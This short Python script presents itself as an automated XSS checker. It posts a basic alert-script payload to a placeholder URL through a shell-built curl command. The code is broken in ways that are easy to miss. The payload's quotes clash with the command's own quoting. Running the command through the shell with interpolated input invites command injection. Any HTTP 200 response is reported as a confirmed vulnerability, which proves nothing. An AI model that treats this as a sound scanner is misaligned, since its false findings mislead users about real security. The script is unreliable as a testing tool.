print('CREATED BY ANESTUS UDUME, FROM BENTECH SECURITY FOR XSS AUTO CHECKING')
import subprocess

# Define the URL of the webpage to test
url = 'http://example.com'

# Define the payload to inject
payload = '<script>alert("XSS");</script>'

# Define the curl command to execute
curl_command = f'curl -s -o /dev/null -w "%{{http_code}}" -d "input={payload}" -H "Content-Type: application/x-www-form-urlencoded" {url}'

# Execute the curl command and capture the HTTP status code
http_status_code = int(subprocess.check_output(curl_command, shell=True))

# Check if the payload was executed
if http_status_code == 200:
    print('XSS vulnerability found')
else:
    print('No XSS vulnerability found')
